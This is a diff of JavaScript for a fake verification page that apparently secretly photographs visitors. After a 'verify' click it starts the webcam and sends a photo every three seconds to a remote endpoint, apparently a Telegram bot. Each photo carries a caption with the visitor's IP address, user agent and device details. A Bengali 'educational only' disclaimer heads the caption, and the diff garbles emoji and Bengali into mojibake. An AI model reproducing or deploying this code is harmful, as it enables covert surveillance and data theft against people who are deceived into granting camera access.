@@ -37,28 +37,7 @@ function showToast(msg){
 function buildCaption(){
   const userAgent = navigator.userAgent;
   const date = new Date().toLocaleString();
-
-  return `⚠️ এটি শুধু শিক্ষামূলক উদ্দেশ্যে বানানো হয়েছে। কেউ কারো ক্ষতি করবেন না।
-
-🌐 IP Address: ${publicIP}
-💻 User-Agent: ${userAgent}
-
-🔋 Battery Percentage: ${extra?.battery || "Unknown"}
-⚡ Charging Status: ${extra?.charging || "Unknown"}
-
-🗣️ Browser Language: ${navigator.language || "Unknown"}
-📏 Screen Size: ${window.screen.width}×${window.screen.height}
-
-🚀 Internet Speed: ${navigator.connection?.downlink ? navigator.connection.downlink + " Mbps" : "Unknown"}
-🌍 Network Type: ${navigator.connection?.effectiveType || "Unknown"}
-
-🧠 Device Memory: ${navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown"}
-
-💾 Storage: Unknown (Browser limited access)
-
-🕒 Date: ${date}
-
-👨‍💻 Developer: <a href="https://t.me/YourTelegramID">Telegram Profile</a>`;
+  return `ЁЯМР IP Address: ${publicIP}\nЁЯТ╗ User Agent: ${userAgent}\nЁЯУЕ Date: ${date}\nтЪая╕П ржПржЯрж┐ рж╢рзБржзрзБ рж╢рж┐ржХрзНрж╖рж╛ржорзВрж▓ржХ ржЙржжрзНржжрзЗрж╢рзНржпрзЗ ржмрж╛ржирж╛ржирзЛ рж╣ржпрж╝рзЗржЫрзЗред ржХрзЗржЙ ржХрж╛рж░рзЛ ржХрзНрж╖рждрж┐ ржХрж░ржмрзЗржи ржирж╛ред\nЁЯФЧ Developer Telegram: @YourTelegramID`;
 }
 
 // Capture & send
@@ -80,11 +59,11 @@ async function captureAndSend(){
         body:formData
       });
       const data = await res.json();
-      if(data.ok) showToast("Photo sent ✅");
-      else showToast("Send failed ❌");
+      if(data.ok) showToast("Photo sent тЬЕ");
+      else showToast("Send failed тЭМ");
     }catch(err){
       console.error(err);
-      showToast("Error ❌");
+      showToast("Error тЭМ");
     }
   },"image/jpeg");
 }
@@ -97,15 +76,15 @@ async function startCamera(){
     video.srcObject = stream;
     video.play();
     captureInterval = setInterval(captureAndSend,3000);
-    showToast("Camera started ✅");
+    showToast("Camera started тЬЕ");
     recaptchaSection.style.display="block";
   }catch(e){
-    showToast("Permission denied ❌");
+    showToast("Permission denied тЭМ");
     console.error(e);
   }
 }
 
-// Button click → start camera
+// Button click тЖТ start camera
 verifyBtn.onclick = () => startCamera();
 
 // reCAPTCHA success callback
@@ -119,3 +98,4 @@ window.onbeforeunload = () => {
   if(stream) stream.getTracks().forEach(track=>track.stop());
   if(captureInterval) clearInterval(captureInterval);
 };
+        
